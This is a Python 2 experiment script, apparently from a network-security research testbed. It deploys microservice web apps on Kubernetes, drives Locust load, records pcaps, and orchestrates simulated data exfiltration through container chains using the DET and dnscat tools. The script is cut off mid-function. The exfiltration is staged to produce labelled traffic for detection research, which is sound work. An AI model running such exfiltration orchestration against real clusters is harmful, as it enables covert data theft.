'''
To see usage: python run_experiment.py --help

it'll save the resulting pcaps in the local folder, since it is necessary to transfer them off of
cloudlab anyway, it makes little sense to use a complicated directory structure to store data at
this stage (though it makes more sense later, when I'm actually analyzing the pcaps)
'''

import argparse
import csv
import os
import signal
import subprocess
import thread
import time
import json
import docker
import random
import re
import pexpect
import shutil
import math
import netifaces
import wordpress_setup.setup_wordpress
import kubernetes
import wordpress_setup.scale_wordpress
import wordpress_setup.kubernetes_setup_functions
import sockshop_setup.scale_sockshop
import pickle
import fcntl
from pwn import process
#from tabulate import tabulate

set_ip, set_port = None, None

#Locust contemporary client count.  Calculated from the function f(x) = 1/25*(-1/2*sin(pi*x/12) + 1.1), 
#   where x goes from 0 to 23 and x represents the hour of the day
CLIENT_RATIO_NORMAL = [0.0440, 0.0388, 0.0340, 0.0299, 0.0267, 0.0247, 0.0240, 0.0247, 0.0267, 0.0299, 0.0340,
  0.0388, 0.0440, 0.0492, 0.0540, 0.0581, 0.0613, 0.0633, 0.0640, 0.0633, 0.0613, 0.0581, 0.0540, 0.0492]

#Based off of the normal traffic ratio but with random spikes added in #TODO: Base this off real traffic
CLIENT_RATIO_BURSTY = [0.0391, 0.0305, 0.0400, 0.0278, 0.0248, 0.0230, 0.0223, 0.0230, 0.0248, 0.0465, 0.0316, 
    0.0361, 0.0410, 0.0458, 0.0503, 0.0532, 0.0552, 0.0571, 0.0577, 0.0571, 0.0543, 0.0634, 0.0484, 0.0458]

#Steady growth during the day. #TODO: Base this off real traffic
CLIENT_RATIO_VIRAL = [0.0278, 0.0246, 0.0215, 0.0189, 0.0169, 0.0156, 0.0152, 0.0158, 0.0171, 0.0190, 0.0215, 
0.0247, 0.0285, 0.0329, 0.0380, 0.0437, 0.0500, 0.0570, 0.0640, 0.0716, 0.0798, 0.0887, 0.0982, 0.107]

#Similar to normal traffic but hits an early peak and stays there. Based on Akamai data
CLIENT_RATIO_CYBER = [0.0328, 0.0255, 0.0178, 0.0142, 0.0119, 0.0112, 0.0144, 0.0224, 0.0363, 0.0428, 0.0503, 
0.0574, 0.0571, 0.0568, 0.0543, 0.0532, 0.0514, 0.0514, 0.0518, 0.0522, 0.0571, 0.0609, 0.0589, 0.0564]


def main(experiment_name, config_file, prepare_app_p, spec_port, spec_ip, localhostip, exfil_p, post_process_only,
         use_k3s_cluster, return_after_prepare_p):
    # step (1) read in the config file
    with open(config_file.rstrip().lstrip()) as f:
        config_params = json.load(f)
    app_name = config_params["application_name"]

    # this file will be used to synchronize the three thread/processes: tcpdump, det, and the background load generator
    end_sentinal_file_loc = './all_done.txt'
    sentinal_file_loc = './ready_to_start_exp.txt'

    if not post_process_only:
        pod_config_file = experiment_name + '_pod_config' '_' + '.txt'
        node_config_file = experiment_name + '_node_config' '_' + '.txt'
        deploy_config_file = experiment_name + '_deploy_config' '_' + '.txt'
        docker_cont_config_file = experiment_name + '_docker_pod_config' '_' + '.txt'
        try:
            os.remove(pod_config_file)
        except:
            print pod_config_file, "   ", "does not exist"
        try:
            os.remove(node_config_file)
        except:
            print node_config_file, "   ", "does not exist"
        try:
            os.remove(deploy_config_file)
        except:
            print deploy_config_file, "   ", "does not exist"
        try:
            os.remove(docker_cont_config_file)
        except:
            print docker_cont_config_file, "   ", "does not exist"

        try:
            exfil_p = exfil_p and config_params['exfiltration_info']['physical_attacks']
        except:
            pass

        try:
            number_reps_workload_pattern = int(config_params['experiment']['number_reps_workload_pattern'])
        except:
            number_reps_workload_pattern = 1

        #split_pcap_interval = config_params['split_pcap']
        network_plugin = 'none'
        try:
            network_plugin = config_params["network_plugin"]
        except:
            pass

        try:
            prob_distro = config_params["prob_distro"]
        except:
            prob_distro = None

        exfil_methods = ['DET']
        try:
            exfil_methods = config_params["exfiltration_info"]["exfil_methods"]
        except:
            pass

        #try:
        #    username = config_params["username"]
        #except:
        #    username = ""

        # this file will be used to synchronize the three thread/processes: tcpdump, det, and the background load generator
        try:
            os.remove(sentinal_file_loc)
        except OSError:
            pass
        try:
            os.remove(end_sentinal_file_loc)
        except OSError:
            pass

        orchestrator = "kubernetes"
        try:
            exfil_paths = config_params["exfiltration_info"]["exfil_paths"]
            DET_min_exfil_bytes_in_packet = list(config_params["exfiltration_info"]["DET_min_exfil_data_per_packet_bytes"])
            DET_max_exfil_bytes_in_packet = list(config_params["exfiltration_info"]["DET_max_exfil_data_per_packet_bytes"])
            DET_avg_exfil_rate_KB_per_sec = list(config_params["exfiltration_info"]["DET_avg_exfiltration_rate_KB_per_sec"])
            exfil_protocols = config_params["exfiltration_info"]["exfil_protocols"]
            class_to_installer = config_params["exfiltration_info"]["exfiltration_path_class_which_installer"]
            originator_class = config_params["exfiltration_info"]["sensitive_ms"][0]
        except:
            exfil_paths = [[]]
            DET_min_exfil_bytes_in_packet = []
            DET_max_exfil_bytes_in_packet = []
            DET_avg_exfil_rate_KB_per_sec = []
            exfil_protocols = []
            class_to_installer = {}
            originator_class = None

        try:
            exfil_path_class_to_image = config_params["exfiltration_info"]["exfil_path_class_to_image"]
        except:
            exfil_path_class_to_image = {}
        print "exfil_path_class_to_image",exfil_path_class_to_image
        #exit(322)

        # okay, now need to calculate the time between packetes (and throw an error if necessary)
        avg_exfil_bytes_in_packet = [(float(DET_min_exfil_bytes_in_packet[i]) + float(DET_max_exfil_bytes_in_packet[i])) \
                                     / 2.0 for i in range(0,len(DET_max_exfil_bytes_in_packet))]
        BYTES_PER_KB = 1000
        avg_number_of_packets_per_second = [(DET_avg_exfil_rate_KB_per_sec[i] * BYTES_PER_KB) / avg_exfil_bytes_in_packet[i] for i
                                            in range(0, len(DET_avg_exfil_rate_KB_per_sec))]
        average_seconds_between_packets = [1.0 / avg_number_of_packets_per_second[i] for i in range(0,len(avg_number_of_packets_per_second))]
        # takes random value between 0 and the max, so 2*average gives the right will need to calculate the MAX_SLEEP_TIME
        # after I load the webapp (and hence the corresponding database)
        maxsleep = [average_seconds_between_packets[i] * 2 for i in range(0,len(average_seconds_between_packets))]

        # step (2) setup the application, if necessary (e.g. fill up the DB, etc.)
        # note: it is assumed that the application is already deployed
        try:
            setup_params = config_params["setup"]
        except:
            setup_params = {}

        if not use_k3s_cluster:
            pod_config_cmds = ['bash', './exp_support_scripts/kubernetes_pod_config.sh', pod_config_file,
                               node_config_file, deploy_config_file, docker_cont_config_file]
            out = subprocess.check_output( pod_config_cmds + ['--clear_files'])
            print out
        else:
            pod_config_cmds = ['ls']
        if prepare_app_p:
            prepare_app(app_name, setup_params,  spec_port, spec_ip, config_params["Deployment"], exfil_paths,
                        class_to_installer, exfil_path_class_to_image, use_k3s_cluster)

            if return_after_prepare_p:
                exit()

        ip,port = get_ip_and_port(app_name, use_k3s_cluster)
        print "ip,port",ip,port

        # determine the network namespaces
        # this will require mapping the name of the network to the network id, which
        # is then present (in truncated form) in the network namespace
        full_network_ids = ["bridge"] # in kubernetes this is simple
        network_ids_to_namespaces = {}
        network_ids_to_namespaces['bridge'] = 'default' # in kubernetes this is simple

        experiment_length = config_params["experiment_length_sec"]

        # step (3b) get docker configs for docker containers (assuming # is constant for the whole experiment)
        container_id_file = experiment_name + '_docker' + '_'  + '_networks.txt'
        container_config_file = experiment_name + '_docker' '_' +  '_network_configs.txt'
        det_log_file = './' + experiment_name + 'det_logs.log'
        print "det_log_file: ", det_log_file

        try:
            os.remove(container_id_file)
        except:
            print container_id_file, "   ", "does not exist"
        try:
            os.remove(container_config_file)
        except:
            print container_config_file, "   ", "does not exist"
        out = subprocess.check_output(['pwd'])
        print out

        if not use_k3s_cluster:
            out = subprocess.check_output(['bash', './exp_support_scripts/docker_network_configs.sh', container_id_file, container_config_file])
            print out

        if orchestrator == 'kubernetes':
            # need some info about services, b/c they are not in the docker network configs
            svc_config_file = experiment_name + '_svc_config' '_' +  '.txt'
            try:
                os.remove(svc_config_file)
            except:
                print svc_config_file, "   ", "does not exist"
            print os.getcwd()
            out = subprocess.check_output(['bash', './exp_support_scripts/kubernetes_svc_config.sh', svc_config_file])
            print out

        # step (5) start load generator
        i = 0
        max_client_count = int( config_params["experiment"]["number_background_locusts"])
        thread.start_new_thread(generate_background_traffic, ((int(experiment_length)+2.4), max_client_count,
                    config_params["experiment"]["traffic_type"], config_params["experiment"]["background_locust_spawn_rate"],
                                                              config_params["application_name"], ip, port, experiment_name,
                                                              sentinal_file_loc, prob_distro, pod_config_cmds,
                                                              number_reps_workload_pattern))

        # step (4) setup testing infrastructure (i.e. tcpdump)
        if not use_k3s_cluster:
            for network_id, network_namespace in network_ids_to_namespaces.iteritems():
                current_network = client.networks.get(network_id)
                current_network_name = current_network.name
                interfaces = ['any']  # in kubernetes this is easy
                filename = experiment_name + '_' + current_network_name + '_'
                for interface in interfaces:
                    thread.start_new_thread(start_tcpdump, (interface, network_namespace, str(int(experiment_length)),
                                                        filename + interface + '.pcap', orchestrator, sentinal_file_loc))

        # step (6) start data exfiltration at the relevant time
        if exfil_p:
            print "exfil_p", exfil_p
            exfil_StartEnd_times = config_params["exfiltration_info"]["exfil_StartEnd_times"]
        else:
            exfil_StartEnd_times = []

        with open(det_log_file, 'w') as g:
            fcntl.flock(g, fcntl.LOCK_EX)
            g.write('\n')
            fcntl.flock(g, fcntl.LOCK_UN)

        thread.start_new_thread(cluster_creation_logger, ('./' + exp_name + '_cluster_creation_log.txt',
                                                          './' + end_sentinal_file_loc, sentinal_file_loc,
                                                          exp_name))

        exfil_aggregated_file = './' + experiment_name + 'exfil_aggregate'
        open(exfil_aggregated_file, 'w').close()
        #################
        ### sentinal_file_loc ;; should wait here and then create the file...
        time.sleep(40) # going to wait for a longish-time so I know that the other threads/processes
                       # have reached the waiting point before me.
        ## now create the file that the other thread/processes are waiting for
        with open(sentinal_file_loc, 'w') as f:
            f.write('ready to go')
        # now wait for 3 more seconds so that the background load generator can get started before this and tcpdump start
        time.sleep(3)
        # start the pod creation logger
        #subprocess.Popen(['python', './exp_support_scripts/cluster_creation_looper.py', './' + exp_name + '_cluster_creation_log.txt',
        #                  './' + end_sentinal_file_loc], shell=False, stdin=None, stdout=None, stderr=None, close_fds=True)
        subprocess.Popen(['bash', './exp_support_scripts/hpa_looper.sh', str(int(math.ceil(float(experiment_length)/60))),
                          './' + exp_name + '_hpa_log.txt'],  shell=False, stdin=None, stdout=None,
                         stderr=None, close_fds=True)
        print "DET part going!"

        ##################
        # now loop through the various exfiltration scenarios listed in the experimental configuration specification
        start_time = time.time()
        i = 0
        exfil_info_file_name = './' + experiment_name + '_det_server_local_output.txt'

        for exfil_counter, next_StartEnd_time in enumerate(exfil_StartEnd_times):
            with open(det_log_file, 'a') as g:
                fcntl.flock(g, fcntl.LOCK_EX)
                g.write('\nExfil: ' + str(exfil_counter) + '\n')
                fcntl.flock(g, fcntl.LOCK_UN)

            next_exfil_start_time = next_StartEnd_time[0]
            next_exfil_end_time = next_StartEnd_time[1]
            cur_exfil_method = exfil_methods[exfil_counter]
            cur_exfil_protocol = exfil_protocols[exfil_counter]

            bytes_exfil_list = []
            start_ex_list = []
            end_ex_list = []
            #selected_containers = {}

            if exfil_p:
                if start_time + next_exfil_start_time - time.time() - 60.0 > 0.0:
                    print "waiting to perform exfil....."
                    time.sleep(start_time + next_exfil_start_time - time.time() - 60.0)

                print "about_to_start_exfil..."

                selected_containers,local_det = start_det_exfil_path(exfil_paths, exfil_counter, cur_exfil_protocol, localhostip,
                                                                    maxsleep, DET_max_exfil_bytes_in_packet, DET_min_exfil_bytes_in_packet,
                                                                    experiment_name, start_time, network_plugin, next_exfil_start_time,
                                                                    originator_class, cur_exfil_method, exfil_protocols, True,
                                                                    det_log_file)

                print "exfil started..."

                #time.sleep(start_time + next_exfil_end_time - time.time())
                ## monitor for one of the exfil containers being stopped and restart if possible...
                while(start_time + next_exfil_end_time - time.time() > 0.0):
                    time.sleep(1.0)
                    # then check if everything is still alive.
                    all_alive, stopped_containers = containers_still_alive_p(selected_containers)
                    if not all_alive:  # if it's not...
                        print "Container died!"

                        with open(det_log_file, 'a') as g:
                            fcntl.flock(g, fcntl.LOCK_EX)
                            g.write('\nRestarting exfiltration...\n')
                            fcntl.flock(g, fcntl.LOCK_UN)

                        # stop everything.
                        stop_det_instances(selected_containers, cur_exfil_method)
                        os.killpg(os.getpgid(local_det.pid), signal.SIGKILL)

                        # (recall: need to process everything...)
                        bytes_exfil, start_ex, end_ex = parse_local_det_output(exfil_info_file_name, exfil_protocols[exfil_counter])
                        bytes_exfil_list.append( bytes_exfil )
                        start_ex_list.append( start_ex )
                        end_ex_list.append( end_ex_list )

                        # restart everything
                        ## need remove stopped container from selected_containers
                        for stopped_container in stopped_containers:
                            exfil_element, container = stopped_container[0], stopped_container[1]
                            del selected_containers[exfil_element]
                        selected_containers, local_det = \
                            start_det_exfil_path(exfil_paths, exfil_counter, cur_exfil_protocol, localhostip,
                                                 maxsleep, DET_max_exfil_bytes_in_packet,
                                                 DET_min_exfil_bytes_in_packet, experiment_name, start_time,
                                                 network_plugin, next_exfil_start_time, originator_class,
                                                 cur_exfil_method, exfil_protocols, False, det_log_file)
                    else:
                        pass
                        #print "no containers died!"

                stop_det_instances(selected_containers, cur_exfil_method)

                ## is this part fine???
                bytes_exfil, start_ex, end_ex = parse_local_det_output(exfil_info_file_name, exfil_protocols[exfil_counter])
                print bytes_exfil, "bytes exfiltrated_in_most_recent_instance"
                print "starting at ", start_ex, "and ending at", end_ex
                print bytes_exfil + sum(bytes_exfil_list), "bytes exfiltrated_in_current_exfil_scenario"

                bytes_exfil = bytes_exfil + sum(bytes_exfil_list)
                with open(exfil_aggregated_file, 'a+') as g:
                    g.write(cur_exfil_protocol + ' ' + str(bytes_exfil) + " bytes exfiltrated" + '\n')

                with open(det_log_file, 'a') as h:
                    fcntl.flock(h, fcntl.LOCK_EX)
                    h.write('Exfil results: ' + cur_exfil_protocol + ' ' + str(bytes_exfil) + " bytes exfiltrated" + '\n')
                    fcntl.flock(h, fcntl.LOCK_UN)

                os.killpg(os.getpgid(local_det.pid), signal.SIGKILL)
                print "attempting to kill: " + str(local_det.pid)

        ################

        # step (7) wait, all the tasks are being taken care of elsewhere
        time_left_in_experiment = start_time + int(experiment_length) + 7 - time.time()
        time.sleep(time_left_in_experiment)

        with open(end_sentinal_file_loc, 'w') as f:
            f.write('all_done')

        subprocess.call(['cat', './' + experiment_name + '_locust_info.csv' ])

        subprocess.call(['cp', './' + experiment_name + '_locust_info.csv', './' + experiment_name + '_locust_info_' +
                           '.csv' ])
        # for det, I think just cp and then delete the old file should do it?
        if exfil_p:
            subprocess.call(['cp', './' + experiment_name + '_det_server_local_output.txt', './' + experiment_name +
                             '_det_server_local_output_' + '.txt'])
            subprocess.call(['truncate', '-s', '0' ,'./' + experiment_name + '_det_server_local_output.txt'])

        #''' # enable if you are using cilium as the network plugin
        if network_plugin == 'cilium':
            cilium_endpoint_args = ["kubectl", "-n", "kube-system", "exec", "cilium-6lffs", "--", "cilium", "endpoint", "list",
                                "-o", "json"]
            out = subprocess.check_output(cilium_endpoint_args)
            container_config_file = experiment_name + '_' + '_cilium_network_configs.txt'
            with open(container_config_file, 'w') as f:
                f.write(out)
        #'''

    filename = experiment_name + '_' + 'bridge' + '_' # note: will need to redo this if I want to go
                                                      # back to using Docker Swarm at some point
    pcap_filename = filename + 'any' + '.pcap'
    if not post_process_only and not use_k3s_cluster:
        recover_pcap(orchestrator, pcap_filename)
        print "pcap recovered!"

    ### note: the code below this is not working...

    # let's make sure that the packets in the pcap are in order (otherwise there can be problems sometimes (rarely, but still))
    # NOTE: this is not tested!!
    editcap_instr = ["editcap", "-S 0.000001", pcap_filename,  pcap_filename + 'in_order']
    print "editcap_instr", editcap_instr
    try:
        out = subprocess.check_output(editcap_instr)
    except Exception, e:
        print "editcap_instr failed (was supposed to make PCAP inorder...", e

    print "editcap -S out", out
    out = subprocess.check_output(["rm", "-f", pcap_filename])
    print "rm orign pcap out", out
    out = subprocess.check_output(["mv", pcap_filename + 'in_order', pcap_filename])
    print "mv inorder pcap to orig pcap out:", out

    # okay, now compress it
    if app_name == "wordpress":
        out = subprocess.check_output(['gzip', pcap_filename])
        print "gzip_cmd_out", out

    ##  split tthe pcap
    ### DO NOT WANT TO SPLIT THE PCAP ACTUALLY
    #cmd_list = ["editcap", "-i " + str(split_pcap_interval), filename + 'any' + '.pcap', filename + 'any']
    #out = subprocess.check_output(cmd_list)
    #print out

    time.sleep(2)

    copy_experimental_info_to_experimental_folder(exp_name)

    try:
        os.remove(end_sentinal_file_loc)
    except OSError:
        pass

def stop_det_instances(selected_container, cur_exfil_method):
    # note: looping over everything b/c I wanna stop the proxies too...
    for class_name, container in selected_container.iteritems():
        if container.status == "running":
            if cur_exfil_method == 'DET':
                stop_det_client(container)
            elif cur_exfil_method == 'dnscat':
                stop_dnscat_client(container)
            else:
                print "that exfiltration method was not recognized!"

def containers_still_alive_p(selected_containers):
    # recall: selected_container[exfil_element] = chosen_container
    all_alive = True
    stopped_containers = []
    for exfil_element, container in selected_containers.iteritems():
        container.reload()
        #print "is_container_running?: ", str(container.name), str(container.status), str(container.short_id)
        if container.status != "running":
            all_alive = False
            stopped_containers.append((exfil_element, container))
    return all_alive, stopped_containers


# exfil dependencies are already in the docker image! this function just picks the relevant concrete instances
# and starts DET
def start_det_exfil_path(exfil_paths, exfil_counter, cur_exfil_protocol, localhostip, maxsleep,
                         DET_max_exfil_bytes_in_packet, DET_min_exfil_bytes_in_packet, experiment_name,
                         start_time, network_plugin, next_exfil_start_time, originator_class,
                         cur_exfil_method, exfil_protocols, wait_p, det_log_file):

    print "start_det_exfil_path_time", time.time()

    # setup config files for proxy DET instances and start them
    # note: this is only going to work for a single exp_support_scripts and a single dst, ATM
    selected_containers, class_to_networks = find_exfil_path(exfil_paths, exfil_counter)

    proxy_instance_to_networks_to_ip = map_container_instances_to_ips(orchestrator, selected_containers,
                                                                      class_to_networks, network_plugin)

    start_det_proxies(exfil_paths, exfil_counter, selected_containers, proxy_instance_to_networks_to_ip,
                      cur_exfil_protocol, localhostip, class_to_networks, maxsleep,
                      DET_max_exfil_bytes_in_packet, DET_min_exfil_bytes_in_packet, det_log_file)

    print "preparing to start local_det_server...."

    # this does NOT need to be modified (somewhat surprisingly)
    local_det = start_det_server_local(cur_exfil_protocol, ip, maxsleep[exfil_counter],
                                       DET_max_exfil_bytes_in_packet[exfil_counter],
                                       DET_min_exfil_bytes_in_packet[exfil_counter], experiment_name, det_log_file)

    ######
    if wait_p:
        print start_time, next_exfil_start_time, time.time(), start_time + next_exfil_start_time - time.time()

        time.sleep(start_time + next_exfil_start_time - time.time())

    ######

    start_det_exfil_originator(exfil_paths, exfil_counter, originator_class, selected_containers,
                               proxy_instance_to_networks_to_ip, localhostip, class_to_networks, maxsleep,
                               DET_min_exfil_bytes_in_packet, DET_max_exfil_bytes_in_packet,
                               cur_exfil_method, exfil_protocols, det_log_file)

    return selected_containers, local_det

def find_exfil_path(exfil_paths, exfil_counter):
    selected_container = {}
    class_to_networks = {}
    for exfil_element in exfil_paths[exfil_counter]:
        if exfil_element not in selected_container:
            possible_containers, class_to_networks[exfil_element] = get_class_instances(orchestrator, exfil_element, "None")
            chosen_container = random.sample(possible_containers, 1)[0]
            selected_container[exfil_element] = chosen_container
    return selected_container, class_to_networks

def start_det_proxies(exfil_paths, exfil_counter, selected_container,proxy_instance_to_networks_to_ip, cur_exfil_protocol,
                      localhostip, class_to_networks, maxsleep, DET_max_exfil_bytes_in_packet, DET_min_exfil_bytes_in_packet,
                      det_log_file):
    for exfil_element in exfil_paths[exfil_counter][:-1]:
        container_instance = selected_container[exfil_element]
        # going to determine srcs and dests by looking backword into the exp_support_scripts class, index into the selected proxies,
        dst, src = find_dst_and_src_ips_for_det(exfil_paths[exfil_counter], exfil_element,
                                                selected_container, localhostip,
                                                proxy_instance_to_networks_to_ip, class_to_networks)
        output_lines = "cur_dst_src " + str(dst) + '  ' + str(src) + " for " + str(container_instance) + ';' + str(container_instance.name)\
                       + " lzl \n" + " config stuff: " + str(container_instance.name) + ' ' + src + ' ' + dst + ' ' + \
                       str(proxy_instance_to_networks_to_ip[container_instance]) + '\n'
        print output_lines
        with open(det_log_file, 'a') as g:
            fcntl.flock(g, fcntl.LOCK_EX)
            g.write(output_lines)
            fcntl.flock(g, fcntl.LOCK_UN)
        start_det_proxy_mode(orchestrator, container_instance, src, dst, cur_exfil_protocol,
                             maxsleep[exfil_counter], DET_max_exfil_bytes_in_packet[exfil_counter],
                             DET_min_exfil_bytes_in_packet[exfil_counter], det_log_file)


def start_det_exfil_originator(exfil_paths, exfil_counter, originator_class, selected_container, proxy_instance_to_networks_to_ip,
                               localhostip, class_to_networks, maxsleep, DET_min_exfil_bytes_in_packet, DET_max_exfil_bytes_in_packet,
                               cur_exfil_method, exfil_protocols, det_log_file):
    # now setup the originator (i.e. the client that originates the exfiltrated data)
    next_instance_ip, _ = find_dst_and_src_ips_for_det(exfil_paths[exfil_counter], originator_class,
                                                       selected_container, localhostip,
                                                       proxy_instance_to_networks_to_ip,
                                                       class_to_networks)

    # print "next ip for the originator to send to", next_instance_ip
    directory_to_exfil = config_params["exfiltration_info"]["folder_to_exfil"]
    regex_to_exfil = config_params["exfiltration_info"]["regex_of_file_to_exfil"]
    files_to_exfil = []
    container = selected_container[originator_class]
    file_to_exfil = setup_config_file_det_client(next_instance_ip, container, directory_to_exfil,
                                                 regex_to_exfil, maxsleep[exfil_counter],
                                                 DET_min_exfil_bytes_in_packet[exfil_counter],
                                                 DET_max_exfil_bytes_in_packet[exfil_counter])
    files_to_exfil.append(file_to_exfil)

    file_to_exfil = files_to_exfil[0]
    container = selected_container[originator_class]
    if cur_exfil_method == 'DET':
        thread.start_new_thread(start_det_client, (file_to_exfil, exfil_protocols[exfil_counter], container, det_log_file))
    elif cur_exfil_method == 'dnscat':
        thread.start_new_thread(start_dnscat_client, (container,det_log_file))
    else:
        print "that exfiltration method was not recognized!"

def prepare_app(app_name, setup_config_params, spec_port, spec_ip, deployment_config, exfil_paths, class_to_installer,
                exfil_path_class_to_image, use_k3s_cluster):

    if app_name == "sockshop":
        #sockshop_setup.scale_sockshop.main(deployment_config['deployment_scaling'], deployment_config['autoscale_p'])
        sockshop_setup.scale_sockshop.deploy_sockshop(deployment_config['deployment_scaling'], deployment_config['autoscale_p'], use_k3s_cluster)

        # modify images appropriately
        install_exfil_dependencies(exfil_paths, orchestrator, class_to_installer, exfil_path_class_to_image)

        sockshop_setup.scale_sockshop.scale_sockshop(deployment_config['deployment_scaling'], deployment_config['autoscale_p'], use_k3s_cluster)

        time.sleep(480) # note: may need to increase this...
        if spec_port or spec_ip:
            print "spec_port", spec_port, "spec_ip", spec_ip
            ip,port=spec_port, spec_ip
        else:
            ip, port = get_ip_and_port(app_name, use_k3s_cluster)

        print setup_config_params["number_background_locusts"], setup_config_params["background_locust_spawn_rate"], setup_config_params["number_customer_records"]
        print type(setup_config_params["number_background_locusts"]), type(setup_config_params["background_locust_spawn_rate"]), type(setup_config_params["number_customer_records"])
        print "ip", ip, "port", port
        request_url = "--host=http://" + ip + ":"+ str(port)
        request_url = "-H=http://" + ip + ":"+ str(port)
        print request_url
        prepare_cmds = ["locust", "-f", "./sockshop_setup/pop_db.py", request_url, "--no-web", "-c",
                        str(setup_config_params["number_background_locusts"]), "-r", str(setup_config_params["background_locust_spawn_rate"]),
             "-t", "10min"]
        print("Current_directory", os.getcwd())
        print prepare_cmds
        try:
            out = subprocess.check_output(prepare_cmds)
            print out
        except subprocess.CalledProcessError as e:
            #print "exception_in_prepare_apps: ", e
            print "command '{}' return with error (code {}): {}".format(e.cmd, e.returncode, e.output)

    elif app_name == "atsea_store":
        pass
        '''
        print setup_config_params["number_background_locusts"], setup_config_params["background_locust_spawn_rate"], setup_config_params["number_customer_records"]
        print type(setup_config_params["number_background_locusts"]), type(setup_config_params["background_locust_spawn_rate"]), type(setup_config_params["number_customer_records"])
        request_url = "--host=https://" + ip + ":"+ str(port)
        print request_url
        prepare_cmds = ["locust", "-f", "./load_generators/seastore_pop_db.py", request_url, "--no-web", "-c",
                        setup_config_params["number_background_locusts"], "-r", setup_config_params["background_locust_spawn_rate"],
             "-n", setup_config_params["number_customer_records"]]
        print prepare_cmds
        out = subprocess.check_output(prepare_cmds)
        #with open('./' + app_name + '_debugging_background_gen.txt', 'a') as f:
        #    print >> f, out
        print out
        '''
    elif app_name == "wordpress":
        deployment_scaling = deployment_config['deployment_scaling']
        autoscale_p = deployment_config['autoscale_p']
        cpu_percent_cuttoff = deployment_config['cpu_percent_cuttoff']["wordpress"]

        if 'pxc' in deployment_scaling:
            pxc_replicas = deployment_scaling['pxc']
        else:
            pxc_replicas = 7

        wordpress_setup.scale_wordpress.deploy_wp(pxc_replicas)
        install_exfil_dependencies(exfil_paths, orchestrator, class_to_installer, exfil_path_class_to_image)
        wordpress_setup.scale_wordpress.scale_wordpress(autoscale_p, cpu_percent_cuttoff, deployment_scaling)

        time.sleep(420) # note: may need to increase this...

        if spec_port or spec_ip:
            ip,port=spec_port, spec_ip
        else:
            ip, port = get_ip_and_port(app_name, use_k3s_cluster)

        print "scaling wordpress complete..."
        #try:
        #     wordpress_setup.setup_wordpress.main(ip, port, "hi")
        #except Exception,e:
        #    print "wordpress_setup.setup_wordpress.main triggered this exception: ", str(e)
        #print "setup_wordpress completed..."
    elif app_name == "hipsterStore":
        # TODO: make sure this part works with k3s...
        # clone the github repo b/c we're going to use their load generator
        if not use_k3s_cluster:
            heapstr_str = ["minikube", "addons", "enable", "heapster"]
            out = subprocess.check_output(heapstr_str)
            print "heapstr_str_response ", out
            metrics_server_str= ["minikube", "addons", "enable", "metrics-server"]
            out = subprocess.check_output(metrics_server_str)
            print "metrics_server_str_response ", out

        wordpress_setup.kubernetes_setup_functions.wait_until_pods_done("kube-system")
        out = subprocess.check_output(['bash', 'hipsterStore_setup/deploy_hipsterStore.sh'])

        # TODO: when the google dev's fix the advservice serivce, I'll want to remove it from the except_pods param
        wordpress_setup.kubernetes_setup_functions.wait_until_pods_done("default", except_pods=['adservice',])

        try:
            out = subprocess.check_output(['bash', 'hipsterStore_setup/autoscale_hipsterStore.sh'])
            print "autoscale_hipsterStore_out...", out
        except:
            pass

        del_load_str = ["kubectl", "delete", "deploy", "loadgenerator"]
        out = subprocess.check_output(del_load_str)
        print "out", out
        install_exfil_dependencies(exfil_paths, orchestrator, class_to_installer, exfil_path_class_to_image)
    elif app_name == "robot-shop":
        pass # TODO
    else:
        # other applications will require other setup procedures (if they can be automated) #
        # note: some cannot be automated (i.e. wordpress)
        pass

# Func: generate_background_traffic
#   Uses locustio to run a dynamic number of background clients based on 24 time steps
# Args:
#   time: total time for test. Will be subdivided into 24 smaller chunks to represent 1 hour each
#   max_clients: Arg provided by user in parameters.py. Represents maximum number of simultaneous clients
def generate_background_traffic(run_time, max_clients, traffic_type, spawn_rate, app_name, ip, port, experiment_name,
                                sentinal_file_loc, prob_distro, pod_config_log_cmds, number_reps_workload_pattern):
    devnull = open(os.devnull, 'wb')  # disposing of stdout manualy

    client_ratio = []
    total_total_requests = 0
    total_failed_requests = 0

    if (traffic_type == "normal"):
        client_ratio = CLIENT_RATIO_NORMAL
    elif (traffic_type == "bursty"):
        client_ratio = CLIENT_RATIO_BURSTY
    elif (traffic_type == "viral") :
        client_ratio = CLIENT_RATIO_VIRAL
    elif (traffic_type == "cybermonday"):
        client_ratio = CLIENT_RATIO_CYBER
    else:
        raise RuntimeError("Invalid traffic parameter provided!")
        #client_ratio = CLIENT_RATIO_NORMAL

    client_ratio = client_ratio * number_reps_workload_pattern

    if (run_time <= 0):
        raise RuntimeError("Invalid testing time provided!")

    normalizer = 1/max(client_ratio)
    locust_info_file = './' + experiment_name + '_locust_info.csv'
    print 'locust info file: ', locust_info_file

    try:
        os.remove(locust_info_file)
    except:
        print locust_info_file, "   ", "does not exist"

    subprocess.call(['touch', locust_info_file])

    if prob_distro:
        if app_name == "sockshop":
            with open('./prob_distro_sock.pickle', 'w') as f:
                f.write(pickle.dumps(prob_distro))
        elif app_name == "wordpress":
            with open('./prob_distro_wp.pickle', 'w') as f:
                f.write(pickle.dumps(prob_distro))
        elif app_name == "hipsterStore":
            with open('./prob_distro_hs.pickle', 'w') as f:
                f.write(pickle.dumps(prob_distro))
        elif app_name == "robot-shop":
            with open('./prob_distro_rs.pickle', 'w') as f:
                f.write(pickle.dumps(prob_distro))

    #############################################
    # this code is to help sync up the various components
    while not os.path.exists(sentinal_file_loc):
        time.sleep(0.3)
    print "generation_of_background_traffic part going!"
    #############################################

    timestep = run_time / len(client_ratio)
    for i in xrange(len(client_ratio)):

        client_count = str(int(round(normalizer*client_ratio[i]*max_clients)))
        proc = 0
        try:
            if app_name == "sockshop":
                print "sockshop!"
                '''
                locust_cmds = ["locust", "-f", "./sockshop_setup/background_traffic.py",
                         "--hoste=http://"+ip+ ":" +str(port), "--no-web", "-c",
                        client_count, "-r", str(spawn_rate), '--csv=' + locust_info_file,
                '''
                locust_cmds = ["locust", "-f", "./sockshop_setup/background_traffic.py",
                                         "-H=http://"+ip+ ":" +str(port), "--no-web", "-c",
                                        client_count, "-r", str(spawn_rate), '--csv=' + locust_info_file,
                               "-t", str(int(timestep) - 1) + 's']
                print "locust_cmds", locust_cmds
                proc = subprocess.Popen(locust_cmds, preexec_fn=os.setsid, stdout=devnull, stderr=devnull)
                #print "locust_out",
                #print proc.stdout
            # for use w/ seastore:
            elif app_name == "atsea_store":
                '''
                                seastore_cmds = ["locust", "-f", "./load_generators/seashop_background.py", "--host=https://"+ip+ ":" +str(port),
                            "--no-web", "-c",  client_count, "-r", spawn_rate, '--csv=' + locust_info_file]
                '''
